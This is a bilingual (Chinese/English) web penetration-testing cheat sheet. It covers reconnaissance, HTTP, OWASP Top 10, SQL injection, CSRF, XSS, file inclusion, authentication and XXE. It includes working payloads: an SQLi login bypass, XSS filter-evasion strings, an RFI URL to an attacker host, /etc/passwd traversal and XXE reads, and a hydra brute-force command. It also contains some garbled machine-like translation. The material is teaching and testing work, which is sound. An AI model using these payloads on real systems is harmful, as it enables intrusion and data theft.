# Web安全

## 文件夹:

### urllib2

- 简单报文GET、POST、报头、身份认证脚本
- 扫描CMS配套设施
- 暴力破解目录和文件位置
- 暴力破解HTML表单认证

### 命令注入攻击

- 暴力破解密码

### 注入漏洞

- 暴力破解密码
- 定时SQL注入
- Cookie的暴力破解


### PHP 壳代码（Shellcodes）

- php入门
- “异”或（逻辑运算）（xor）
- 开发

### 用户名
- cookie身份验证
- 用户名

### 钓鱼网站

- log.php


### 检测装置

- heartbleed（中文译名：心脏出血BUG）





---

## Web开发的步骤:

### 1) 信息收集

* 创建字典: 使用 **cewl.rb**/

* 下载网站: **wget -rck**, **httrack**:
```
$ wget -rck <TARGET-WEBSITE>
```
* 电子邮件账户身份证明: 使用 **theharverster**, **maltego**, **msfcli (metasploit)**.

* 提取元数据: 使用 **Metagoofil** 和 **FOCA**. 也可以使用 googling qith ```地址: www.url.com ext:pdf intitle:"Documents and settings"```.

* 对建立在相同IP地址的其他域的搜索（虚拟主机）: 使用 **revhosts**.

* 帮助:

	* 如果涉及一个数据库 -->  资料隐码的入侵模式.

	* 如果这种输入被用在网站中 --> XSS漏洞.


### 2) 自动检测 (检测装置)

* 工具: **Nikto**, **w3af**, **skipfish**, **Arachni**, **ZAP**/

* 爬虫: **GoLISMERO**.

* 有趣的文件: search for robots.txt, gitignore, .svn, .listin, .dstore, 等等. 工具: **FOCA**.

* 暴力破解文件夹和文件: **dirb** 和 **dirbuster**.

* 为了识别不同类型的漏洞，模糊各种参数、目录和其他，例如: XSS, SQLi, LDAPi, Xpathi, LFI, or RFI. 工具: **PowerFuzzer**, **Pipper** 或者 ***Burpproxy***. 推荐模糊字典： **fuzzdb**.


### 3. 人工测试

* 测试漏洞: Burpproxy, ZAP, sitescope.

* 确定允许网站操作的组件和插件,可能是以下类型的CMS(内容管理系统): Joomla组件, Wordpress插件, Php-Nuke, drupal, Movable Type, Custom CMS, Blogsmith/Weblogs, Gawker CMS, TypePad, Blogger/Blogspot, Plone, Scoop, ExpressionEngine, LightCMS, GoodBarry, Traffik, Pligg, Concrete5, Typo3, Radiant CMS, Frog CMS, Silverstripe, Cushy CMS 等等. 然后找到已知的漏洞 **/** 与之相关. 工具: **joomla Scan** or **cms-explorer**.

* 报头, http方法, 会话, 证书: 我们可以使用任何一个像代理或一个简单的远程登录的工具连接到网站。

* 指纹识别网站的架构和配置: **httprint**.

* 对识别任何错误和/或漏洞的参数的操作。 我们可以使用任何代理来巧妙地处理请求。 对应用程序的正常运行的修改： 单引号,null值“% 00”,回车,随机数等。

* 分析Flash、Java和其他文件: 识别并下载网站上所有的Flash文件。 要做到这一点,我们可以使用谷歌搜索: ```filetype:swf site:domain.com```. 我们也可以使用wget工具：

```
$ /wget -r -l1 -H -t1 -nd -N -nd -N -A.swf -erobots=off <WEBSITE> -i output_swf_files.txt
```

* 一旦我们确定并下载。 *.swf 文件, 我们必须分析代码的函数(如* loadMovie *)变量以识别那些请求并允许例如跨站脚本等其他类型的漏洞。下面显示了一些有漏洞的函数：

```
_root.videourl = _root.videoload + '.swf';
video.loadMovie(_root.videourl);
getURL - payload. javascript:alert('css') getURL (clickTag, '_self')
	load* (in this case: loadMovie) - payload: as
function.getURL,javascript:alert('css')
	TextField.html - payload: <img src='javascript:alert("css")//.swf'>
```

* 我们可以例如* * Deblaze * *和* * SWFIntruder * *的工具。我们还应该分析 AllowScriptAccess, Flash Parameter Pollution 或者 sensitive APIs的参数：

```
loadVariables, loadVariblesNum, MovieClip.loadVariables, loadVars.load, loadVars.sendAndLoad
XML.load, XML.sendAndLoad
URLLoader.load, URLStream.load
LocalConnection
ExternalInterface.addCallback
SharedObject.getLocal, SharedObject.getRemote
```

* 认证系统:首先是确定网站的凭证是否存储在浏览器中。这可能会被对默认账户和字典的攻击所利用。默认账户有：admin, administrator, root, system, user, default, name application.我们可以使用 **hydra** ：

```
$ hydra -L users.txt -P pass.txt <WEBSTE> http-head/private
```



---
## 你如何攻击一个Web应用程序

* **模糊测试**： 当非预期的数据被输入到应用程序时会发生什么？
* **认证测试**: 身份验证要求总是强制执行的吗？
* **授权测试**: 授权可以被绕过吗？
* **信息披露**: 信息披露有助于妥协应用吗？


### Web测试方法：

- 映射攻击面：
	* 抓取并清点所有的请求和回复。
	* 遵循所有链接。
	* 用有效的数据填写每个表格。
	* 未经验证的/已验证的。
	* 无特权的/特许的。

- 在抓取过程中识别关键请求和功能。

- 使用日志作为模糊GET和POST参数的输入。

- 使用经过验证日志来发现未受保护的资源。

- 使用特权日志发现没有正当授权的资源。

- 针对其他潜在弱点分析日志。


---

### 当我们有一个网站/ IP地址：

- 试图将文件夹添加到域,如： http://csaw2014.website.com or http://key.website.com.

- 我们暴力破解子域，例如：使用 [subbrute.py]. 这个工具通过搜索可能的子域的列表，执行多线程DNS，查找到一个可配置DNS解析器列表。

- 在Linux中使用 ```dig``` 或 ```ping``` 命令来找到IP地址或者网站。

- 用类似于 ```wget -e robots=off --tries=40 -r -H -l 4 <WEBSITE>``` 的东西 *wgetting* 整个网站。

- 检查 *robot.txt* 文件来搜寻隐藏文件夹。

- 使用浏览器的开发工具检查DOM，寻找HTML注释（当内容通过Ajax加载时，单纯地查看源代码不会有用）。


-----

## URLs（统一资源定位符）

### 八进制

- 例如: http://017700000001 --> 127.0.0.1

- 例如： 206.191.158.50:

((206 * 256 + 191) * 256 + 158 ) * 256 + 50 = 3468664370.

现在,有一种方法可以进一步让这个地址更模糊。 你可以将这个4字节的数字相加， 乘上 4294967296 (2564) 的任意倍数。
（Now, there is a further step that can make this address even more obscure. You can add to this dword number, any multiple of the quantity 4294967296 (2564)）


### 伟大的 @

- 在 "http://" 和 "@" 之间的任何东西都是彻底不相关的。

```
http://doesn'tmatter@www.google.org
http://!$^&*()_+`-={}|[]:;@www.google.com
```

- @ 标志可以用它的十六进制代码%40表现。
- 点是 %2e



----

## HTTP

* HTTP是基于一系列的客户端请求和web服务器响应的无状态协议。

* HTTP请求和响应由报头、请求或响应的主体组成。

* HTTP请求必须使用特定的请求方法。

* HTTP响应包含一个状态码。

* HTTP是一个纯文本的协议。

* 请求的第一行修改为包含协议版本信息，以及接下来是零个或多个名称：值对（报头）：
	- 用户代理(User-Agent):浏览器版本信息
	- 主机(Host): URL主机名
	- 接受（Accept）:支持MIME文档(如无格式正文（text/plain）或MPEG格式的音频)
	- 支持的语言(Accept-Language):支持语言代码
	- 来源(referer): 原始页面的请求
* 头用一个空行终止,后可能紧接任何客户端希望传递给服务器负载（长度需要是内容长度的头所指定的）。、

* 有效负载通常是浏览器的数据,但没有要求。



### GET 方法

* 传递**URL查询字符串**中的所有请求数据。.

```
GET /<URL QUERY STRING> HTTP/1.1
User-Agent:Mozilla/4.0
Host: <WESITE>
<CRLF>
<CRLF>
```

### POST 方法

* 传递**HTTP请求主体**中的所有请求数据。

```
POST /<LINK> HTTP/1.1
User-Agent:Mozilla/4.0
Host: <WEBSITE>
Content-Lenght:16
<CRLF><CRLF>
name=John&type=2
```

### HTTP状态码

* 1xx - 信息化。
* 2xx - 成功。 例如： 200: 0K.
* 3xx - 重定向。 例如： 302: Location.
* 4xx - 客户端错误。 例如: 403: Forbidden, 401: Unauthorized, 404: Not found.
* 5xx - 服务器错误。 例如： 500: Internal Server Error.


### 会话标识符（IDs）

* HTTP协议不维护请求之间的状态。如果想要保持状态,必须使用状态跟踪机制,如会话标识符(会话ID),会话标识符在请求中传递，用来连接请求和会话。
* 会话标识符可以在这些地方传递：
	- URL
	- 隐藏表单字段
	- Cookie HTTP头部


### Cookies

* 想要初始化一个会话，服务器发送一个Set-Cookie的头，这个头以名称=值对（NAME=VALUE pair）开始，接着是零个或多个半冒号分割属性值对（semi-colon-separated attribute-value pairs）(域, 路径, 有效期, 安全).

```
Set-Cookie: SID=472ndsw;expires=DATE;path=/;domain=SITE,HttpOnly
```

* 客户机向服务器发送Cookie头以继续会话。




----

## 同源策略

### DOM同源策略

* JavaScript在其中一个文件的环境中执行，它不应该被允许访问另一个文档的环境,除非:**协议、主机名和端口**都匹配。这定义了文档的来源。

* IE不总观测端口号

* 通配符 * 策略是不明智的：探索您的域名上的内容，以从任何/所有来源的脚本进行访问。

### 跨域策略
* 超越文件的来源扩展SOP。
* 允许来自另一个域的应用程序访问资源。
* 允许使用白名单头发行任意HTTP请求。

### CORS - 跨来源资源共享

* 浏览器允许XMLHttpRequest访问从跨源请求中返回的响应数据：
	- 响应包含Access-Control-Allow起源的头
	- 请求的源值在集合中定义


----

## OWASP前十名

1. Injection
2. XSS
3. Broken Authentication and Session management
4. Insecure Direct Object Reference
5. CSRF
6. Security Misconfiguration
7. Insecure Cryptographic Storage
8. Failure to Restrict URL access
9. Insufficient Transport Layer Protection
10. Unvalidated Redirects and Forwards.


----
## 注入式攻击

* 在相同环境的混合代码和输入时就会发生。
* 敌意输入被解释器解析为代码。

### SQL 注入

* 例如，用户名和密码的输入文本框。服务器端代码可以是:
```
String query = "SELECT user_id FROM user_data WHERE name = '  " + input.getValue("userID") + " ' and password = ' " + input.getValue("pwd") + " ' ";
```

* SQL查询可以被SQL Server解释：

```
SELECT user_id FROM user_data  WHERE name='john' and password='password'
```

* 然而，如果攻击者输入**密码'或'1'='1**，不需要密码！

* 有关更多信息,请参见子文件夹SQLi。

----

## 跨站点请求伪造（CSRF）

* 欺骗受害者的浏览器执行不知情的行为。

* 服务器不验证请求是否被期望的客户端源所模仿。

* 浏览器在尝试检索资源时天真地提交凭证。

* 识别和验证CSRF手册可以通过检查网站的形式来完成(通常做经常在这里找到这个漏洞)。

* 要检查这一点,您将需要在表单上复制一个原始请求(GET / POST),然后做出相同的改变参数和重发请求的修改。如果服务器不返回错误，则可以认为它很容易受到CSRF攻击。

* 执行这个任务,我们可以使用工具 **csrftester** 或 **burp** 代理。

* 可以用来利用admin-only漏洞(路由器管理页面等)。

* 一个简单的缓冲，通常难以实现:包括请求的秘密用户/会话的特定值。


### CSRF示例：

1. 用户在bank.com上登录。
2. 在另一个选项卡中，用户访问一个图片的来源:
```
<img src="http://bank.com/xfer.do?frmACCT=user&toAcct=Attackker&amt=10000"/>
```
3. 用户的浏览器从图像中发送一个GET请求。
4. 用户只需将100k转移到Joe的账户中。


----

## 跨站脚本攻击（XSS）

* 当不受信任的数据被发送到web浏览器而不验证或编码内容时，就会出现这种情况。

* 允许攻击者在易受攻击的站点的域内向web浏览器注入脚本代码。
	- 窃取会话cookie和DOM中的任何其他数据。
	- 取消网站内容或重定向到第三方网站。
	- 开发未修补的web浏览器或插件。

* 类型：
	- 反映(瞬态):从响应直接回应的的请求的负载。
	- 持久:有效载荷被存储并返回到另一个页面中。
	- DOM基础：由于不安全的JavaScript而出现客户端

### 持续载荷

1. 攻击者向服务器上传：
```
GET /VulnerablePage.jsp?p1=<script>evil();</script>
```

2. 受害人的请求：
```
GET /VulnerablePage.jsp
```

3. 但她/他得到的：
```
<html><body>(...)evil();</script></body></html>
```

### 反映负载

1. 受害者点击了一些恶意链接：
```
<a href="http://website.com/Vuln.jsp?p1=%3cscript%3eevil();%3c/script%3e">Click here!</a>
```
2. 受害者的GET请求：
```
GET /Vuln.jsp?p1=<script>evil();</script>
```
3. 返回的内容：
```
<html><body>(...)<script>evil();</script>(..)
```


### XSS壳（Shell） & XSS隧道（Tunnel）

* XSS后门允许攻击者通过发送命令来控制受害者的浏览器。
* 攻击者请求通过XSS壳代理来模仿受害者执行请求。
* 允许攻击者绕过IP限制和所有形式的身份验证。

### XSS识别和开发技术

* 反映:选择你的有效载荷，模糊，观察反应。(XSS过滤器逃避欺骗名单) [XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet).
* 持久性:包括一个惟一的字符串和grep响应。
* DOM:分析JavaScript对受用户影响的对象:
	- document.URL
	- document.write
* 绕过脆弱的应用程序过滤器和输出编码:尝试不同的变体:

```
<IMG SRC=javascript:alert('XSS')>// no"or;
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>//no'
```
* 编码攻击字符串: URL, UTF-8, UTF-7
* 欺骗浏览器使用替代字符集(编码一致性的必要性):
```
<?php
header('Content-Type: text/html; charset=UTF-7');
$string = "<script>alert('XSS');</script>";
$string = mb_convert_encoding($string, 'UTF-7');
echo htmlentities($string);
?>
```

### XSS防御

* 验证(白名单)
* 将HTML转换为HTML实体等价:
	- < 可以用 &lt; 或 &#60 表示
	- > 可以用 &gt; 或 &#63 表示
* 编码时考虑环境 (JavaScript, inline-HTML, URLs)


---

## 不安全的文件处理

* 利用包括指令来执行攻击者的选择文件。
* 文件包含在各种web编程框架中被使用。
* RFI在PHP中更常见，但是Java和asp/asp也易受LFI影响。

```
<?php $page = $_GET["page"];
include($page); ?>
```
页面在 ***http://www.target.com/vuln.php?page=http://www.attacker.com/rooted.php***.

* RFI 取决于php.ini中是 **allow_url_fopen** 还是 **allow_url_include** 。

* 不安全的文件上传:上传失败来限制文件类型和文件是可访问的。

* 尝试上传任意文件类型 (.jsp, .aspx, .swf): 操作内容类型（Content-Type）的请求头

* 一旦上传，确定上传的内容是否可以访问。如果它在服务器上是可执行的，它就结束了。如果它是可下载的，它可能会利用恶意内容的用户。

* 尝试混合文件：
```
GIF89a(...binary data...)
<?php phpinfo();  ?> (...
```


### Identifying File Handling Bugs

* Fuzz and grep response for file system related messages:
```
qr / ((could not|cannot|unable to) (open|find|access|read)|(path|file) not found) /i;
```

* Analyze requests for parameters passing paths and filenames.

* Try directory traversal, NULL  bytes, etc.
```
/FileDownload?file=reports/SomeReport.pdf
/FileDownload?file=../../etc/passwd%00.pdf
```


###  Meta-character Injection Bugs

* File Input/Output is a common place where meta-character injection comes into play.

* For example if file ="../../../../../etc/passwd" below:

```
$file = $_GET['file'];
$fd = fopen("/var/www/$file");
```
* Even if it had a txt extension it wouldn't matter. The reason is that PHP strings are indiferent to NLL byte, so all  the attacker needs to insert is "../../../../../etc/passwd%00":

```
$file = $_GET['file'];
$fd = fopen("/var/www/$file.txt");
```
* PHP NULL byte insertion and directory traversal are common.


---

## Authentication

* Applications can verify identity based on:

	- Something the user knows: password, passphrase, pin, etc.
	- Something the user has: smartcard, security token, mobile device/
	- Something the user is or does: fingerprint, voice recognition.

* Common authentication methods:
	- HTTP authentication
	- Form-based
	- Kerberos/NTLM
	- Single Sign-on (SSO)
	- Certificate based

### Basic Authentication

* Credentials are Base64 enconded: in the format username:password
* Each subsequent request includes credentials with the Authorization HTTP request header.

* For example, admin:admin is YWRtaW46YWRtaW4=:

```
GET /home.jsp HTTP/1.1
Host: www.acme.com
User-Agent: Mozilla/4.0
Authorization: Basic YWRtaW46YWRtaW4=
```

* Password brute force: if no lockout, automate: **Hydra, Brutus**.


### Bypassing Authentication

#### Server-Side

* Predicting session tokens: what's the character composition of cookie?
* Session hijacking via fixation/trapping: same session cookie used pre and post authentication?
* Exploiting an injection flaw in login routine: SQL Injection.

#### Client-Side

* Does application set persistent authentication cookies: remember me or look for Expires attribute of Set-Cookie header.

* Back button to steal cached credentials (credentials stored in browser memory).

### Weak Authentication

* Does application authenticate requests across all resources?

* Issue direct requests to resources (forceful browsing): guess common file names.

* Inventory resources authenticated & request anonymously.
	- Authenticate, crawl through UI, and record requests, responses.
	- Re-issue those requests unauthenticated and diff responses.



-----

## Authorization

* System of determining whether a user is allowed to access a particular resource.

* Role-based authorization.

* Access decision can be made at:
	- resource level
	- function/method-level
	- record-level

### Authorization Attacks

* Vertical:
	- Elevate to a more privileged user
	- access restricted functionality
	- edit records intend to be read only

* Horizontal:
	- access another user's data

* Parameter manipulation: insecure direct object reference (DB record id's exposed to user).

*  Failure to restrict URL access:
	- protect sensitive functionality by disabling the display of links, buttons, URL, and hidden URL or parameters.
	- forceful browsing is a common attack technique: typically results in vertical escalation, administrative interfaces.


---

## Attacking Web Servers

### XML Web Services

* Facilitate machine to machine interaction:
	- usually implemented as middleware, though sometimes called directly by the client.
	- often implemented using **Simple Object Access Protocol (SOAP)**.
	- request and Response structure defined by *8Web Service Definition language (WSDL).

### Attacking web services

1. Locate the web service endpoint.

	* pay attention to proxy logs
	* look for common web service endpoints: .asmx, .svc, /axis, /axis2

2. Obtain metadata.

	* Try appending **?	WSDL** or **.wsdl** to endpoint URL.
```
<portType>: Operations performed by the web service
<message>: Messages used by the web service
<types>: datatypes used by the web service
<binding>: protocol used by the web service
```

3. Invoke the web service:

	* Issue SOAP requests directly to end point (SoapUI)
	* Fuzz inputs just like any other parameter: same vulnerabilities.

### Exploiting XML Parsers

* Web services often vulnerable to common attacks on XML parsers.
* Entity expansion attacks:
	- Denial of service against XML parser.
	- Infinite recursion occurs during parsing.
* XML External Entity attacks:
	- Information disclosure to almost anything.

### XML External Entity Attacks:

1. Define an XML entity in the DTD
2. Reference defined entity in XML body.
3. Parser will read /etc/passwd contents:

```
<!DOCTYPE test [<!ENTITY x3 System "/etc/passwrd">]>
<body>
<e1>&x3;</e1>
</body>
```





-----------------

## Other Tools
* [FireBug](http://getfirebug.com/)
* [Burp Suite](http://portswigger.net/burp/)
